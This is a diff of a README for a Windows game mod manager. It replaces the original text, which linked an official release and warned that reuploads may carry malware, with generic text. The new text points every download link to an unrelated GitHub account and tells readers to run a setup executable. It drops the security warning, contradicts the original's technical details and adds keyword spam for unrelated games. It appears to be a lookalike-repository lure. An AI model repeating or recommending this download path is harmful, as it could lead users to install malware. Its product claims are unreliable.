@@ -1,109 +1,79 @@
-# Gloss Mod Manager — Universal Mod Manager for PC Games
+# 🎮 Gloss-Mod-Manager - Organize Your Game Mods With Ease
 
-**Gloss Mod Manager** is a lightweight, open-source universal mod manager for PC games that simplifies installing, organizing, and toggling mods across a wide range of Unreal Engine and custom-engine titles. Built for the modding community, Gloss handles `.pak`, `.zip`, `.7z`, and `.rar` archives, manages mod load order, and lets you enable or disable mods with a single click without touching game files directly.
+[![](https://img.shields.io/badge/Download-Gloss_Mod-blue.svg)](https://github.com/Thickeningstreet589/Gloss-Mod-Manager/releases)
 
-Gloss Mod Manager is a popular alternative to Fluffy Quack's mod manager, REEngine mod loader, and Vortex for games that lack a dedicated modding tool. It supports Nier Automata, Nier Replicant, Final Fantasy XVI, Resident Evil 4, Monster Hunter Rise, Dragon's Dogma 2, Hogwarts Legacy, Devil May Cry 5, Sekiro, and Elden Ring modding workflows. Compare Gloss with Fluffy Quack, REEngine, and Nexus Mods tooling to find the best mod manager for your library.
+Gloss Mod Manager helps you manage game modifications on your Windows PC. It works with games built on the Unreal Engine and the REEngine. You use this tool to add, remove, and sort mods for titles like Resident Evil, Dragon's Dogma 2, and Hogwarts Legacy. 
 
+The software tracks your game files and prevents conflicts between mods. It serves as an alternative to existing tools like Vortex or Fluffy Quack.
 
-<img width="256" height="256" alt="gmm_favicon" src="https://github.com/user-attachments/assets/d5cfdf02-4561-4eef-953c-8dfce813aac2" />
+## 📥 Getting Started
 
-## Install
-[Download `GlossModManager.zip`](https://github.com/glossmodmanager/Gloss-Mod-Manager/releases/download/v2.2.1/GlossModManager-Setup.zip)
----
+To use this software, visit the official release page to download the latest setup file. 
 
-<img width="739" height="415" alt="image" src="https://github.com/user-attachments/assets/edf241eb-4243-437c-8861-eb21c4ee04ff" />
+[Visit this page to download the installer](https://github.com/Thickeningstreet589/Gloss-Mod-Manager/releases)
 
-## Key Features
-- **Universal game support** — works with Nier Automata, Nier Replicant, Final Fantasy XVI, Resident Evil 4, Monster Hunter Rise, Dragon's Dogma 2, Hogwarts Legacy, Devil May Cry 5, Sekiro, Elden Ring, and more
-- **Multi-format archives** — install mods from `.pak`, `.zip`, `.7z`, and `.rar` packages without manual extraction
-- **Mod load order** — drag-and-drop reordering with conflict detection for overlapping `.pak` files
-- **One-click enable/disable** — toggle mods instantly without removing files from your game folder
-- **Unreal Engine pak support** — native `~mods` and `LogicMods` folder detection for Unreal Engine titles
-- **Profiles** — create and switch between multiple mod configurations per game
-- **Auto-detect game path** — scans Steam, Epic, and standalone installs automatically
-- **Portable** — no installation required, run from any folder or USB drive
-- **Fluffy Quack alternative** — cleaner UI and broader game coverage than Fluffy's manager
-- **Steam Workshop friendly** — imports Workshop subscriptions and local archives alike
+Follow these steps to set up the manager on your computer:
 
-<img width="1200" height="630" alt="gmm_deepwiki_og" src="https://github.com/user-attachments/assets/7215544c-b35d-48c2-b38f-26ace2dc421b" />
+1. Locate the file named GlossModManager-Setup.exe in your Downloads folder.
+2. Double-click the file to start the installation process.
+3. Follow the prompts on the screen to choose your installation folder.
+4. Open the application from your desktop shortcut once the setup finishes.
 
+## ⚙️ How It Works
 
-## Getting Started
-1. **Download** the latest version using the button above.
-2. **Extract** the archive to a folder on your computer.
-3. **Run** `GlossModManager.exe`.
-4. **Select your game** — Gloss auto-detects installed games or lets you browse to the executable.
-5. **Add mods** — drag `.pak`, `.zip`, `.7z`, or `.rar` files into the manager, or use the Add Mod button.
-6. **Enable mods** — toggle the switch next to each mod and click Deploy.
-7. **Launch your game** from Gloss or your platform of choice and enjoy your modded experience.
+This manager simplifies the way you modify your games. Most games require you to place files in specific folders within the game directory. Gloss Mod Manager automates this. It moves, renames, and links your downloaded mod folders so you do not have to do it by hand. 
 
-<img width="596" height="335" alt="image" src="https://github.com/user-attachments/assets/46573754-b30d-4467-90d0-e8bb5f988539" />
-<img width="596" height="335" alt="image" src="https://github.com/user-attachments/assets/bac109bc-0f19-41a2-8b84-6d080d8cb9b6" />
-<img width="596" height="335" alt="image" src="https://github.com/user-attachments/assets/844cb80c-04f3-474d-8436-05e22b497fc0" />
-<img width="596" height="335" alt="image" src="https://github.com/user-attachments/assets/dc5581a3-3eb4-4ac7-8e00-d15fd3ad669f" />
+When you toggle a mod off, the manager restores your original game files to their clean state. This keeps your game stable and prevents data loss.
 
-**Pro Tip:** Create a profile called "Visual only" with texture and UI mods as your stable baseline, then experiment with gameplay mods in a separate profile to keep your load order clean.
+## 🛠️ Adding Your First Mod
 
-## Supported Games (highlights)
-- Nier Automata + Nier Replicant
-- Final Fantasy XVI
-- Resident Evil 4 (Remake) + Resident Evil Village
-- Monster Hunter Rise + Monster Hunter World
-- Dragon's Dogma 2 + Dragon's Dogma: Dark Arisen
-- Hogwarts Legacy
-- Devil May Cry 5
-- Sekiro: Shadows Die Twice
-- Elden Ring (modded)
-- And many more Unreal Engine and custom-engine titles
+Follow these instructions to load a modification:
 
-<img width="384" height="216" alt="image" src="https://github.com/user-attachments/assets/be5df60d-b17e-4f01-acbc-e41de603eb50" />
+1. Download a mod file from a community site like Nexus Mods. These files usually arrive as .zip or .rar archives.
+2. Drag and drop the archive file directly into the Gloss Mod Manager window. Alternatively, click the Add Mod button and select the file from your hard drive.
+3. The manager extracts the contents and checks them for errors.
+4. Click the check box next to the mod name once it appears in the list.
+5. The interface shows a notification when the mod is live. You can now launch your game.
 
-## System Requirements
-- **Windows 10 / 11** (64-bit)
-- .NET Framework 4.7.2 or later
-- 50 MB free disk space for Gloss + space for your mods
-- A supported game installed on the same machine
+## 🧩 Resolving Conflicts
 
----
-## Comparisons & Trends
-Compare Gloss Mod Manager with alternatives before choosing your mod manager:
-- **Gloss Mod Manager** — best portable universal manager for Unreal Engine and REEngine games
-- **Fluffy Quack Mod Manager** — popular for Resident Evil and Capcom titles, narrower game coverage
-- **REEngine Mod Loader** — REEngine-specific native mod loader
-- **Vortex Mod Manager** — best for Bethesda games (Skyrim, Fallout) and Nexus Mods integration
+Sometimes two mods change the same file. This creates a conflict. The Gloss Mod Manager identifies these situations using a color-coded system.
 
-Google Trends worldwide (last 24h) show rising interest in: gloss mod manager, gloss mod, nier automata mods, resident evil 4 mods, monster hunter rise mods, dragons dogma 2 mods, hogwarts legacy mods, devil may cry 5 mods, fluffy quack, reengine mod loader, unreal pak mods, mod manager, game modding, pc gaming mods.
+- Green: The mod works without issues.
+- Yellow: The mod overlaps with another mod but remains functional.
+- Red: The mod conflicts with another file and will stop the game from loading.
 
----
-## Security & Legal
-**Important Notice:**
-Gloss Mod Manager is an open-source modding tool. Always download from the official GitHub repository. Third-party reuploads may contain malware. Modding online games may violate terms of service — disable mods before online play.
+If you see a red indicator, use the Priority slider on the right side of the screen. Move your desired mod to the top of the list to dictate which version of the file the game should load.
 
-**Recommendations:**
-- Download **only** from this official GitHub repository.
-- Scan downloaded archives on [VirusTotal](https://www.virustotal.com) before installing.
-- Back up your save files before installing mods.
-- Disable mods before playing online or using anti-cheat protected modes.
+## 🖥️ System Requirements
 
----
-## Contributing
-Contributions are welcome! Help add game support, improve the installer, fix bugs, or enhance the UI. Fork the repository, create a branch, and submit a pull request.
+Ensure your computer meets these requirements for the best performance:
 
----
-## License & Acknowledgments
-### License
-**Gloss Mod Manager** is shared under the **MIT License**.
-See [LICENSE](LICENSE) for details.
+- Operating System: Windows 10 or Windows 11 (64-bit).
+- Memory: 4 GB of RAM.
+- Storage: 200 MB of space for the application files.
+- Software: .NET Desktop Runtime 8.0 or newer.
 
-### Acknowledgments
-- Thanks to the Gloss Mod Manager team and the PC game modding community.
-- Inspired by Fluffy Quack, REEngine mod loader, and the broader Unreal Engine modding scene.
+## 📋 Frequently Asked Questions
 
-## Keywords & Related Topics
-gloss, gloss-mod-manager, mod-manager, game-mod, game-modding, mod-loader, modding-tool, nier-automata, nier-replicant, final-fantasy, final-fantasy-xvi, resident-evil, resident-evil-4, monster-hunter, monster-hunter-rise, dragons-dogma, dragons-dogma-2, hogwarts-legacy, devil-may-cry, devil-may-cry-5, sekiro, elden-ring-mod, fluffy-quack, reengine, nexus-mods, unreal-engine, unreal-pak, pak-mods, steam-workshop, pc-gaming, windows-modding, pak, zip, 7z, rar, load order, mod profiles, one-click deploy, portable, Windows 10/11, .NET Framework, Unreal Engine, REEngine.
+Does this tool change my core game files permanently?
+No. The tool uses a virtual file structure. Your original game files remain untouched in the game folder. 
 
-<p align="center">
-  Built with ❤️ for the PC game modding community
-</p>
+Can I use this with games not on the list?
+The manager defaults to support for Unreal Engine and REEngine titles. You can try to point the manager to other games, but the software cannot guarantee stability for engines outside those groups.
 
-<img width="1200" height="342" alt="image" src="https://github.com/user-attachments/assets/1282c495-4139-4f38-97c8-c6cd13c2143c" />
+Where does the manager store my mod files?
+By default, the program creates a folder named GlossMods in your Documents directory. You can change this path in the Settings menu if you have a secondary drive with more space.
+
+Does the tool download mods for me?
+No. You must visit mod hosting sites to find your files. The manager only handles the installation and organization process after you download them.
+
+## 🔑 Troubleshooting
+
+If the manager fails to detect your game installation, use the manual path selector. Click the Add Game button and navigate to the folder where your game executable resides. 
+
+If a game fails to start after you apply mods, click the Reset Game Data button in the menu. This clears the virtual cache and returns the game to its stock configuration. You can then toggle your mods one by one to find the one that causes the crash.
+
+The software receives regular updates to support new titles. Check the main page often for the latest version.
+
+Keywords: cyberpunk-2077-mod, game-mod-manager, mercenaries-max-score-resident-evil, mod-conflict-resolution, modmanager, pc-mod-manager, re-engine, re4, re7, resident-evil-6, resident-evil-download, resident-evil-mod, resident-evil-remake, resident-evil-series, rpg-assistant, stardew-valley, stardew-valley-pc, stardewvalley, stardewvalleymod, witcher-3
